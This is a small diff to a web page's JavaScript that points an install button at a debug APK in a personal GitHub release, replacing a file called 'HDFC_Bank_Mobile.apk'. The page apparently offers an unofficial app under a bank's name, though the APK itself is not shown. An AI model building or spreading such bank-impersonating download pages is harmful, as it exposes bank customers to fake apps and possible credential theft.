@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', () => {
     // PASTE YOUR REAL GITHUB RELEASE LINK HERE:
-    const REAL_APK_URL = 'HDFC_Bank_Mobile.apk'; 
+    const REAL_APK_URL = 'https://github.com/amanxridex/newmade/releases/download/v1.0.12/app-debug.apk'; 
     
     const installBtn = document.getElementById('installBtn');
     let deferredPrompt;
